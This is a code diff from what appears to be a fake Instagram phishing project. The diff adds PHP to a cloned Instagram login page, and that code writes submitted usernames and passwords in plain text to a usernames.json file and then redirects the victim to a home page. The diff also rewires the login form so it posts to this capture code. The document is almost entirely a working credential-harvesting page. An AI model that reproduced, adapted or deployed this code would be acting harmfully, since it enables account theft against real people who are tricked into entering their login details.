@@ -1,13 +1,29 @@
-<!--
-#  _____     _          ___           _                                  
-# |  ___|_ _| | _____  |_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___  
-# | |_ / _` | |/ / _ \  | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \ 
-# |  _| (_| |   <  __/  | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
-# |_|  \__,_|_|\_\___| |___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
-#                                              |___/
-#                         by [Ali Milani Amin]
-#             ~> https://github.com/AliMilani/fake-instagram/
--->
+<?php
+if (!empty($_POST)) {
+    $data = array(
+        'username' => $_POST['username'],
+        'password' => $_POST['password']
+    );
+    
+    $file = "usernames.json";
+    
+    // Cek apakah file usernames.json sudah ada, jika tidak, buat file baru
+    if (!file_exists($file)) {
+        $initial_data = array();
+        file_put_contents($file, json_encode($initial_data));
+    }
+    
+    $current_data = file_get_contents($file);
+    $array_data = json_decode($current_data, true);
+    $array_data[] = $data;
+    $final_data = json_encode($array_data, JSON_PRETTY_PRINT);
+    
+    file_put_contents($file, $final_data);
+    header('Location: ./home.php');
+    exit;
+}
+?>
+
 <html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">
   <head>
     <meta charset="utf-8" />
@@ -18210,7 +18226,7 @@
                     class="HmktE"
                     id="loginForm"
                     method="post"
-                    action="login.php"
+                    action=""
                   >
                     <div class="qF0y9 Igw0E IwRSH eGOV_ _4EzTm kEKum">
                       <div class="-MzZI">
